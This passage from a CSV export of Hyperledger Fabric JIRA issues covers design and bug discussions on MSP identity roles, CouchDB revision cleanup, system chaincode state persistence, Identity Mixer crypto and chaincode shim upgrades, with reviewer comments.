Not sure what you are running into but the original error - unable to create ex05 and ex04 - is gone I think. If you agree, that takes care of this JIRA.;;;","28/Sep/17 11:03 PM;Ratnakar;[~muralisr] Apologies Murali.

This is not the issue described in this bug and seems a different issue. 
I will create a new Jira Item for this.;;;","06/Oct/17 1:01 PM;Hangyu_FJH;Same thing happened with example passthru

I commit a changeSet by referring to [~muralisr] 's fix

https://gerrit.hyperledger.org/r/#/c/14247/;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,
As a user of an MSP i want to be able to distinguish clients from peers,FAB-5664,20038,,Epic,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,angelo.decaro,elli-androulaki,elli-androulaki,09/Aug/17 2:21 AM,17/Jul/19 1:31 AM,28/Oct/23 3:00 AM,20/Mar/18 5:04 AM,v1.1.0,,,v1.1.0,,fabric-crypto,,,,,,1,,,,,,,"*Background / Motivation:*

MSP identities currently do not list the role of the identity owner in the system. That is, currently it is not possible for a user of an MSP instance to tell if a given identity corresponds to a client or a peer or an orderer( or any combination of the previous fields), unless that user knows the internal organisation of that MSP, e.g., that the MSP maps clients of the system to a certain OU, and peers to another.

This epic aims to enhance MSP functionality (and in particular the types of supported MSP principals and MSP configuration) such that distinguishing among system entities is possible in the context of a specific MSP. In this way, one would be able to leverage MSP interface to understand if a given MSP identity is a peer, client or orderer, without being exposed to the internal structure and rules that govern peer, client or orderer identities in that MSP. Extending to this, policy language can be extended to be able to express principals that represent the peers, clients and/or orderers that reside within an organisation. 

Candidate solutions to the issue described above should cover i) specification of the rules distinguishing client/peer/orderer certificates in an MSP configuration,  ii) incorporation of these rules to identity issuing operations in Fabric-CA or methodology on how to incorporate these rules in Commercial CA's certificates, iii) extension of the MSP principal definition to cover also client, peer, orderer roles, iv) extension of the policy language to allow the specification of an organisation's role in the system. 

 

*I. Suggested alternatives for setting the rules distinguishing system entities in Fabric MSP:*

Below we list a couple of alternatives on ways to distinguish identities of clients, peers, and orderers of Fabric MSP. In any case we assume the extension of FabricMSPConfig with an activation flag of the feature.

 

_Alternative A_*: Leverage KeyUsage/ExtKeyUsage fields of X.509 certificates.*

Distinguish the role of an entity using the KeyUsage/ExtendedKeyUsage fields of X.509 certificates that represent identities in Fabric MSP. That is an identity from Fabric MSP would be considered a 
 * client by the MSP if it includes a KeyUsage/ExtendedKeyUsage set to include KeyPurposeId = ""Client Authentication"" (id-kp-1)
 * peer/orderer by the MSP if it includes a KeyUsage/ExtendedKeyUsage set to include KeyPurposeID = ""Server Authentication"" (id-kp-2)

More information on the KeyUsage/ExtendedKeyUsage fields of X.509 certificates can be found in [RFC3280|https://tools.ietf.org/rfc/rfc3280.txt]. 

Potential shortcomings of this approach are that the KeyUsage/ExtendedKeyUsage would allow the separation between clients and peers/orderers, but not distinction between orderers and peers. In addition, current value of KeyPurposeId section of ExtendedKeyUsage refers to TLS authentication (TLS WWW server/client authentication), it may cause confusion, and it is not clear if all commercial CAs even support the inclusion of such fields in the X.509 certificates they issue.

Advantages of this method are that no changes for FabricMSPConfig are required.

 

_Alternative B_*: Leverage Namespace of EnrollmentID of the subject.*

Distinguish the role of the identity using the enrollmentID (Common Name) of the identity in question. In particular, in this case FabricMSPConfig would be enhanced with fields denoting suffix/prefix of the considered entities.
{code:java}
string peer-cn-prefix = 11; // namespace of CN of peers
string client-cn-prefix = 12; // namespace of CN of clients
string orderer-cn-prefix = 13; // namespace of CN of orderers{code}
 

This would mean that an identity of Fabric's current MSP, would be considered by FabricMSP as 
 * client if its CN has a namespace equal to client-cn-prefix of the respective FabricMSPConfig
 * peer if its CN has a namespace equal to peer-cn-prefix of the respective FabricMSPConfig
 * orderer if its CN has a namespace equal to orderer-cn-prefix of the respective FabricMSPConfig

Advantages of this mechanism are the easiness in describing clients and peers within the Fabric MSP configuration and enforcing it. 
 Shortcomings of this approach have to do with this approach not necessarily complying with regulations enterprises have sometimes on the format of CNs in their employees' / equipment's certificates.

_Variants of this approach that consider prefix/suffixes of OUs integrated inside the X.509 certificates of entities, are subjected to the same shortcomings._

 

_Alternative C_*: Leverage Organisational Unit (OU) fields of X.509 certificates*

This proposal has to do with the separation of clients, peers, and orderers based on the list of OUs listed in an identity. That is, at MSP configuration time, three (sets of) OUs need to be specified: one to be included in client identities, one to be considered for peer identities, and one for orderer identities.

Recall that OUs can already be included in the configuration of FabricMSP (FabricMSPConfig) to allow OU-field level of granularity of MSP membership definition. OUs appear in FabricMSPConfig in the form of FabricOUIdentifier.

 
{code:java}
// FabricOUIdentifier represents an organizational unit and
// its related chain of trust identifier.
message FabricOUIdentifier {

    // Certificate represents the second certificate in a certification chain.
    // (Notice that the first certificate in a certification chain is supposed
    // to be the certificate of an identity).
    // It must correspond to the certificate of root or intermediate CA
    // recognized by the MSP this message belongs to.
    // Starting from this certificate, a certification chain is computed
    // and boud to the OrganizationUnitIdentifier specified
    bytes certificate = 1;

    // OrganizationUnitIdentifier defines the organizational unit under the
    // MSP identified with MSPIdentifier
    string organizational_unit_identifier = 2;
}
{code}
Essentially, FabricOUIdentifier specifies an OU string in the form that appears inside the subject certificate (organisational_unit_identifier), as well as a reference to the CA whose issued certificates should be considered (certificate). Notice, that allowing wildcard ""ANY"" in the FabricOUIdentifier.certificate would define simply an OU string that should appear to subject certificates (i.e., independently of the signing CA), while allowing wildcard ""ANY"" in FabricOUIdentifier.organisational_unit_identifier would specify all issued certificates by (intermediate) CA. 

This means that extending FabricOUIdentifier definition to allow for wildcard ""ANY"" would give us a way to classify client, peer, orderer certificates on a per intermediate CA basis, or per OU field basis, and or any combination of the two. 

In this case one would need to extend FabricMSPConfig with three additional field, denoting the FabricOUIdentifier of client, peer, and orderer identities:
{code:java}
FabricOUIdentifier peer-ou = 11; // FabricOUIdentifier dedicated to peers
FabricOUIdentifier client-ou = 12; // FabricOUIdentifier dedicated to clients
FabricOUIdentifier orderer-ou = 13; // FabricOUIdentifier dedicated to orderers{code}
while at identity validation time an identity would be considered as: 
 * client if the identity (its signing CA and OUs listed in it) is compliant with the client-ou of the respective FabricMSPConfig
 * peer if the identity (its signing CA and OUs listed in it) is compliant with the peer-ou of the respective FabricMSPConfig
 * orderer if the identity (its signing CA and OUs listed in it) is compliant with the orderer-ou of the respective FabricMSPConfig

If an identity is not compliant with any of the OUs specified at FabricMSP configuration time validation would fail.

Advantages of this approach are that it works on top of any regulation on the format of the certificates and their fields. It is also flexible w.r.t. the way peers/clients/orderer identities are separated: intermediate CAs can be used or OU fields alone or any combination of the two. 

However this approach would require more extended changes to FabricMSPConfig, FabricOUIdentifier (to capture wildcards), and SatisfiesPrincipal implementation of MSP. 

 

*The JIRA items within this Epic assume we go with Alternative C.*",,alacambra,denyeart,elli-androulaki,kchristidis,MichaelWang,nitingaur,qiang0723,smithbk,suryalnvs,troyronda,weeds,wutongtree,,,,,,,,,,,,,,,,,,,,144000,144000,,0%,144000,144000,,,,,,,,,,FAB-6456,,,,,,,,,,,,,,,,FAB-3621,FAB-15388,,,FAB-6547,,,,,,,,,,,,,,,,,,,,,,,,,,,,Unset,,Unset,ghx-label-4,,Allow the distinction among fabric entities within default MSP,To Do,,,Unset,,,,"1|hzycdb:",,,,Unset,Unset,,,,,,,,,,,,,,,,,,alacambra,denyeart,elli-androulaki,kchristidis,MichaelWang,nitingaur,qiang0723,smithbk,suryalnvs,troyronda,weeds,wutongtree,,,,,,,,,,,,,,,,,,,dependabot/npm_and_yarn/asset-transfer-basic/rest-api-typescript/protobufjs-6.11.4,dependabot/npm_and_yarn/asset-transfer-basic/rest-api-typescript/tough-cookie-4.1.3,mergify/bp/release-2.2/pr-4374,dependabot/npm_and_yarn/asset-transfer-basic/rest-api-typescript/grpc/grpc-js-1.8.17,dependabot/go_modules/high-throughput/application-go/google.golang.org/grpc-1.53.0,dependabot/npm_and_yarn/asset-transfer-basic/rest-api-typescript/word-wrap-1.2.4,main,mergify/bp/release-2.2/pr-3750,dependabot/go_modules/asset-transfer-basic/application-go/google.golang.org/grpc-1.53.0,dependabot/npm_and_yarn/asset-transfer-basic/rest-api-typescript/semver-6.3.1,release-2.5,release-2.4,dependabot/npm_and_yarn/asset-transfer-basic/rest-api-typescript/protobufjs-and-fabric-network-7.2.4,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"10/Aug/17 10:20 PM;smithbk;There is only one alternative listed.  Did you mean to list others?
I would prefer to see us use attributes (RBAC).   See https://jira.hyperledger.org/browse/FAB-5346;;;","11/Aug/17 9:15 PM;weeds;This is estimated 3-5 days of work and we have listed here all intermediate tasks that this involves.;;;","11/Aug/17 9:26 PM;weeds;would we say member.peer or how do we write a rule that its for a member peer and not for member client? org1.client or org2.client.  Org1.member or org2.member.  You would be specify org2.peer.  We need to enhance the policy language.  It makes sense to work on this, but we must reconcile how we are doing with ACL.  For example- you want to have a rule on event- all clients can get filtered events.  We can start it, but it will depend on how far we get whether it makes it in on 1.1 and what community thinks.;;;","19/Aug/17 1:49 AM;elli-androulaki;Related CRs (in review):

FAB-5666: [https://gerrit.hyperledger.org/r/#/c/12453/]

FAB-5667: [https://gerrit.hyperledger.org/r/#/c/12459/]

FAB-5668: [https://gerrit.hyperledger.org/r/#/c/12451]

FAB-5669: [https://gerrit.hyperledger.org/r/#/c/12455/]

 ;;;","29/Aug/17 10:01 PM;elli-androulaki;So, I believe this was moved for Release 1.1 - Tech preview due to incompatibility issues with 1.0. 

Will remove the 1.1 label. ;;;","20/Sep/17 7:10 AM;denyeart;[~elli-androulaki] [~angelo.decaro] Please clarify the Description text.  Which of the alternatives mentioned has been chosen? How exactly are OUs leveraged (Is it possible to have multiple OUs in a certificate, e.g. this role-based OU as well as other organization/division information)?  How does this work item relate to the attribute support work item (as mentioned by [~smithbk] in the first comment).

I believe there was general agreement to promote this to Tech Preview 1.1. I have added it to the list of items at [https://wiki.hyperledger.org/projects/fabric/proposedv1_1.] Please edit the description there if necessary.;;;","20/Oct/17 11:12 PM;smithbk;I spoke with Elli and Angelo to make sure we were on the same page regarding RBAC (Role-Based Access Control).
I think we are and I'll try to summarize, but Elli and Angelo can modify as needed.

Our goals are:
1) allow users to define roles for both fabric and chaincode in a consistent way;
2) allow roles to be defined for all identity types, whether the identity is an: a) x509 certificate from fabric CA, b) x509 certificate from 3rd party CA, c) credentials from idemix, or d) some other identity type in the future.
3) allow for separation of duties between:
    a) the chaincode developer who must decide the names of roles which must be used in the code;
    b) the channel creator or chaincode deployer who must decide how to map each role name to a group of identities.
   This separation of duties allows a chaincode to be deployed to multiple environments without code change and can be compared to a servlet being deployed in different environments with different deployment descriptors.

In order to accomplish these goals, MSP and the chaincode library at fabric/core/chaincode/lib/cid (which is a library for performing access control checks based on the Client ID) will use a common RBAC library described at https://jira.hyperledger.org/browse/FAB-6674 (see the change set).  In a nutshell, this RBAC library defines a role to be a <roleName, identityBooleanExpression> such that an identity has a role if the identityBooleanExpression evaluates to true for that identity.

From a fabric perspective, this will be used by MSP to define roles for peer, orderer, and client.  I also think we should add one for ""admin"" so that users do not have to populate the admincerts folder; this would solve https://jira.hyperledger.org/browse/FAB-3752.

From a chaincode perspective, users can configure roles (i.e. set the boolean expression for the role name) at the chaincode level or at the MSP level which may be shared across multiple chaincodes on a channel.  I suggest that we initially just support this at the chaincode level for multiple reasons:
a) it is currently more complex to do a config block update than to instantiate chaincode with args
b) I think we would want to allow a role definition in an MSP to both act as a default which a chaincode deployer could override, or which could not be overridden
c) walk before we run;;;","17/Mar/18 2:13 AM;kchristidis;Err, I believe this should be marked as done?;;;","20/Mar/18 5:04 AM;denyeart;client and peer types added in 1.1, marking as Done.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Cleanup of old document revisions in CouchDB,FAB-5665,20039,,Story,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,chris.elder,denyeart,denyeart,09/Aug/17 2:24 AM,21/Jul/18 3:48 AM,28/Oct/23 3:00 AM,22/Sep/17 9:14 PM,,,,v1.1.0,,fabric-ledger,,,,,,0,Release-planning-1.2,,,,,,"Fabric does not utilize couchdb document replication or old document revisions. As such, the number of revisions that couchdb maintains should be reduced. This can be done with a combination of automatic compaction and reducing _revs_limit.

References:

[https://eclipsesource.com/blogs/2012/07/11/reducing-couchdb-disk-space-consumption/]

*[http://docs.couchdb.org/en/2.0.0/maintenance/compaction.html]*

[http://docs.couchdb.org/en/2.0.0/config/compaction.html|http://docs.couchdb.org/en/2.0.0/config/compaction.html*]

 ",,denyeart,rhegde,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,Unset,,,,,,,,,,,,"1|hzx2ef:",,,,Unset,,,,,,,,Unset,,,,,,,,,,,denyeart,rhegde,,,,,,,,,,,,,,,,,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,main,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"18/Aug/17 12:59 AM;rhegde;we have seen during the file-system-sizing activity, couch db file-system grows like for 50MB raw store, it consumed 1G space. We found that - a compaction needs to be run across databases (even for system databases). Limiting the document version count didn't help much post re-compaction - but is also a recommended option for better file-system utilization.;;;","22/Sep/17 9:14 PM;denyeart;https://gerrit.hyperledger.org/r/#/q/FAB-5665;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Enhance the MSP principal definition to include system entities,FAB-5666,20040,,Story,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,angelo.decaro,elli-androulaki,elli-androulaki,09/Aug/17 3:20 AM,21/Jul/18 3:50 AM,28/Oct/23 3:00 AM,29/Nov/17 9:52 PM,,,,,,fabric-crypto,,,,,,0,,,,,,,MSPPrincipal definition is enhanced to express system entity roles. ,,elli-androulaki,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,Unset,,,FAB-5664,,,,,,,,,"1|hzycdj:",,,,Unset,,,,,,,,Unset,,,,,,,,,,,elli-androulaki,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,main,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"29/Nov/17 9:52 PM;elli-androulaki;https://gerrit.hyperledger.org/r/#/c/12453/;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Enhance the policy language to accommodate system entity based principals,FAB-5667,20041,,Story,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,adc,elli-androulaki,elli-androulaki,09/Aug/17 3:20 AM,21/Jul/18 3:48 AM,28/Oct/23 3:00 AM,08/Dec/17 8:53 PM,,,,,,fabric-crypto,,,,,,0,,,,,,,,,elli-androulaki,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,Unset,,,FAB-5664,,,,,,,,,"1|hzycdr:",,,,Unset,,,,,,,,Unset,,,,,,,,,,,elli-androulaki,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,main,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"29/Nov/17 9:51 PM;elli-androulaki;[https://gerrit.hyperledger.org/r/#/c/12459/]

 ;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Enhance FabricMSPConfig to support client/peer/orderer definition,FAB-5668,20042,,Story,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,angelo.decaro,elli-androulaki,elli-androulaki,09/Aug/17 3:21 AM,21/Jul/18 3:49 AM,28/Oct/23 3:00 AM,20/Oct/17 10:09 PM,,,,,,fabric-crypto,,,,,,0,,,,,,,"This is the first task in the context of FAB-5664. To be able to tell apart clients from peers from orderers, we plan to leverage the organisational units of an MSP identity. Of course, each fabric network instance might have its own way to identify clients, peers and orderers therefore we plan to enhance the FabricMSPConfig adding a new structure called FabricNodeOUs. An instance of FabricNodeOUs allows to define the organisational unit names for clients, peers and orderers. An MSP identity will be considered valid only if it can be identified as a client, peer or orderer. FabricNodeOUs also allows to disable this check, if needed.",,elli-androulaki,smithbk,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,FAB-5999,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,Unset,,,FAB-5664,,,,,,,,,"1|hzycdz:",,,,Unset,,,,,,,,Unset,,,,,,,,,,,elli-androulaki,smithbk,,,,,,,,,,,,,,,,,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,main,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"25/Aug/17 4:58 AM;smithbk;Some comments ...

1) When we start making access control decisions in fabric based on OUs, this will put requirements on fabric CA.
    For example, Alice registers Bob to be a client with the fabric-ca-server;
    however, Bob enrolls and specifies the OU for a peer in the CSR.
    This means Bob is authorized as a peer by MSP even though Alice intended Bob
    to have a client identity with no peer authorization.
    So this means the fabric-ca-server must have a way of limiting what Bob can specify
    in the CSR.

   To address this issue, I've opened FAB-6871. 

2) A single OU name may not be unique.
    For example, you could have the following two DNs:
    a) CN=Alice,OU=Admin,OU=Finance,O=org1,...        - where Alice is an admin in the finance dept
    b) CN=Bob,OU=Admin,OU=Engineering,O=org1,...   - where Bob is an admin in the engineering dept
    You may want Alice to be a peer admin but not Bob.

From looking briefly at the current change sets, I don't think this is handled.

I personally think we need a general purpose expression language which is extensible and would allow customers to specify peer, orderer, client, or other roles as needed based on this language.
For example, an expression required to be true for the peer role: ""OU in ['Admin', 'Finance']"".
;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Extend SatisfiesPrincipal function of MSP to accommodate the new version of MSPPrinciapl,FAB-5669,20043,,Story,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,angelo.decaro,elli-androulaki,elli-androulaki,09/Aug/17 3:22 AM,21/Jul/18 3:49 AM,28/Oct/23 3:00 AM,29/Nov/17 8:00 PM,,,,,,fabric-crypto,,,,,,0,,,,,,,,,elli-androulaki,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,FAB-5999,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,Unset,,,FAB-5664,,,,,,,,,"1|hzyce7:",,,,Unset,,,,,,,,Unset,,,,,,,,,,,elli-androulaki,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,main,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Accommodate transactions with multiple creators and (potentially) no endorsements,FAB-5670,20044,,Story,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,,elli-androulaki,elli-androulaki,09/Aug/17 3:23 AM,12/Sep/18 7:08 PM,28/Oct/23 3:00 AM,12/Sep/18 7:08 PM,,,,Abandoned,,fabric-crypto,fabric-peer,,,,,0,,,,,,,TBA,,elli-androulaki,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,Unset,,,,,,,,,,,,"1|hzycef:",,,,Unset,,,,,,,,Unset,,,,,,,,,,,elli-androulaki,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"12/Sep/18 7:07 PM;elli-androulaki;I believe this is no longer relevant. For use-cases that we need such functionality (e.g., token management) we actually defined a new transaction type. ;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Persistent State in System Chaincode,FAB-5671,20045,,Bug,Closed,FAB,Fabric,software,denyeart,,,High,Done,aleksandar.likic,bstasyszyn,bstasyszyn,09/Aug/17 3:25 AM,02/Mar/20 10:27 PM,28/Oct/23 3:00 AM,15/Aug/17 7:20 AM,v1.0.0,,,v1.1.0,,fabric-peer,,,,,,0,Release-planning-1.1,,,,,,"Currently system chaincodes (other than lscc) are unable to persist state to the ledger since validation fails with the following error:

 [txvalidator] GetInfoForValidate -> ERRO 34e Unable to get chaincode data from ledger for txid xxxxx, due to lscc's state for [xxxscc] not found.

This is because system chaincode instantiations are not stored in LSCC.

For system chaincodes, the chaincode data should be declared in the System Chaincode registry. This data will also include the Policy so that chaincode policies can be validated. This chaincode data will obviously be global across all channels.
 ",,aleksandar.likic,binhn,bstasyszyn,muralisr,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,FAB-17564,,,,FAB-5688,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzycen:",,,,,,,,,,,,,,,,,,,,,,,aleksandar.likic,binhn,bstasyszyn,muralisr,,,,,,,,,,,,,,,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,main,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"09/Aug/17 4:14 AM;muralisr;As described in the description we currently do not ""instantiate"" System CCs on the LSCC's table like we do with user chaincodes (scc's are not instantiated via a proposal). This means that we don't have endorsement policies for the SCCs in the LSCC table and so will fail at commit validation time.

The approach suggested here is a peer wide policy baked into the SCC to be retrieved and used at commit validation time. The problem is that if two peers have different policies for whatever reason (say different versions of peer) then we introduce non-determinism. 

We should consider other approaches first (1) try find other means to solve the requirement that gave rise to SCC transactions or (2) use a baked-in policy check as is done for ""lscc"" validation - signed by channel members - which will be the same on the channel for all peers.

 

 

 

 ;;;","09/Aug/17 4:55 AM;aleksandar.likic;[~muralisr]

(1) try find other means to solve the requirement that gave rise to SCC transactions
 * We have framework components (implemented as SCCs) that need to persist their own data (not application data). Calls could come from a client, or from another CC. I see two ways of implementing this:
 ** SCC calling a companion user CC to persist data; in this case there should be a way to restrict access to the companion user CC, and currently there isn't.
 ** SCC persisting data itself

(2) use a baked-in policy check as is done for ""lscc"" validation - signed by channel members - which will be the same on the channel for all peers.
 * ""sign by any member"" should work for these use cases, so +1 for this option

 ;;;","10/Aug/17 1:35 AM;aleksandar.likic;[~muralisr] How do you think we should test SCC persistence? Normally we would add a new SCC that has some persistence, but that would mean adding it to the Fabric core source code, as it's the only way to do it now.;;;","10/Aug/17 3:04 AM;aleksandar.likic;We could test it using an external SCC, see https://jira.hyperledger.org/browse/FAB-5688

 ;;;","12/Aug/17 3:12 AM;binhn;I would classify this one as bug.

I would proposal that the default behavior is what you mentioned in option 2, but we should look into the possibility of allowing user to instantiate an scc on a channel to bind it to a different endorsement policy and/or with different e/vscc.;;;","12/Aug/17 3:24 AM;aleksandar.likic;OK, just changed it to a bug.;;;","14/Aug/17 7:43 PM;aleksandar.likic;The change has been submitted for review, see [https://gerrit.hyperledger.org/r/#/c/12385/.] The existing test cases involving lscc's persistence should be sufficient for all SCCs, as 'lscc' is not hard-coded any more and the code now handles all SCCs the same.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
"The Identity Mixer core crypto package (in Go lang) that implements basic cryptographic algorithms (key generation, signing, verification, zero-knowledge proofs)",FAB-5672,20050,,Story,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,mdr,dubovitskaya,dubovitskaya,09/Aug/17 6:31 PM,21/Jul/18 3:50 AM,28/Oct/23 3:00 AM,15/Aug/17 4:49 AM,,,,v1.1.0,,fabric-crypto,,,,,10/Aug/17 12:00 AM,0,,,,,,,"This is one of the Identity Mixer contributions to the fabric for privacy-preserving transaction signing.

It consists of the Identity Mixer crypto package (in Go lang) that provides the following functionality:
 * generating the issuer (CA) keys,
 * issuing certificates in a form of Identity Mixer credentials,
 * signing messages and selectively disclosing attributes from the certificates in a fully unlinkable manner, and
 * verifying such signatures.",,dubovitskaya,elli-androulaki,mdr,,,,,,,,,,,,,,,,,,,,,,,,,,,,,288000,7200,,0%,288000,7200,,,,,,,,,,FABC-630,FABC-608,FABN-85,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,Unset,,,FAB-2005,,,,,,,,,"1|hzycev:",,,,Unset,,,,,,,,Unset,,,,,,,,,,,dubovitskaya,elli-androulaki,mdr,,,,,,,,,,,,,,,,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,main,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"11/Aug/17 8:46 PM;mdr;CR: https://gerrit.hyperledger.org/r/#/c/12147/;;;","11/Sep/17 6:35 PM;elli-androulaki;Removed the v1.1 flag, since this is an item aiming for 1.1-technical preview and this classification is already included in the parent epic :);;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
"Fabric Chaincode Shim Upgrade - As a Fabric participant, I want my Fabric chaincode docker images to be deleted and rebuilt upon Fabric peer upgrade, to ensure that the peer and the shim are always in sync",FAB-5676,20057,,Story,Closed,FAB,Fabric,software,denyeart,,,High,Won't Do,mastersingh24,denyeart,denyeart,09/Aug/17 7:47 PM,23/Jan/20 6:59 AM,28/Oct/23 3:00 AM,23/Jan/20 6:59 AM,,,,Future,,fabric-release,,,,,,1,stale-item,,,,,,"Upon upgrade of peer, in order for shim in chaincode container to get the latest fixes and be compatible with peer, the chaincode docker image should get rebuilt based on upgraded shim code.  Otherwise you will be running an outdated shim against an upgraded peer.

- Would need to add Delete of container images. Note - could get ancestor of container to check version, and delete image accordingly.
- This would fix things if you don’t vendor shim in chaincode.
- If you vendor shim into chaicode, you have to upgrade chaincode regardless.",,baohua,binhn,denyeart,jiangyaoguo,joaquimpedrooliveira,sykesm,troyronda,yoheiueda,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,FAB-6446,,,,,,,,,,,FAB-6126,,,,,FAB-3996,,,,FAB-7705,FAB-7303,,,,,,,,,,,,,,,,,,,,,,,,,,,,Unset,,,,,,,,,,,,"1|hzx01b:",,,,Unset,,,,,,,,Unset,,,,,,,,,,,baohua,binhn,denyeart,jiangyaoguo,joaquimpedrooliveira,sykesm,troyronda,yoheiueda,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"18/Aug/17 7:08 AM;binhn;[~greg.haskins] [~muralisr] I think this is related to FAB-5177 where we wanted to remove peer layer dependency. Should we pull FAB-5177 into v1.1 ?

Regarding this one, [~denyeart], looking at the logic, during upgrade, the peer's chaincode containers will shutdown due to broken connection. When the new peer is up, it will start up cc container on demand. Since the chaincode vendors the shim, changes on chaincode won't happen unless it is upgraded. ;;;","21/Aug/17 10:52 PM;binhn;1 important item that we should do is to stop the old version of the chaincode if not in use. Perhaps a simple approach is to shut down any chaincode after a configured inactivity period. This would automatically clear out the old versions when no longer used.;;;","09/Jan/18 2:12 AM;Clayton Sims;I am looking at Jira's and trying to get the finite list of items that need to be code complete by alpha.   Is there any work left on this for alpha?;;;","13/Jan/18 7:16 AM;baohua;IMHO, there will be several thing we should consider:

1. Put a container into unresponsive status incase starting by any invocation, before operation.

2. when upgrading the shim layer, if we simply stop and delete the old images/containers, there will be some interruption delay that the peer stops work. While if we just let the shim layer loaded dynamically, e.g., using golang plugin, then the interruption time can be reduced to nearly ignore.

 

Thoughts?;;;","15/Feb/18 2:24 AM;denyeart;[~mastersingh24] Should we move FAB-3996 and FAB-5676 to 1.2 at this point?;;;","22/Feb/18 12:40 AM;denyeart;Move to 1.2.;;;","23/Mar/18 2:07 PM;denyeart;Many issues were bulk moved from v1.0 or v1.1 to v1.2 as part of a cleanup effort, and many of these issues are not high priority or actually intended to be worked for v1.2.  This issue is being bulk moved to Future.  If the issue is indeed high priority for v1.2 and/or very low effort, please move back to v1.2 and add a comment to indicate rationale.;;;","23/Jan/20 6:59 AM;sykesm;Stale;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Extract gossip service adapter and message crypto service into single mediation interface,FAB-5677,20063,18789,Sub-task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,C0rWin,C0rWin,C0rWin,09/Aug/17 9:33 PM,20/Jul/18 11:14 PM,28/Oct/23 3:00 AM,14/Aug/17 4:58 PM,v1.0.1,,,v1.1.0,,fabric-gossip,,,,,,0,active,candidate,gossip,,,,"Currently there are two external services required for state transfer:

1. Gossip service
2. Message Crypto service

In order to use them state transfer module depends directly on the definitions of those interfaces and requires to pass them into constructor function

{code}
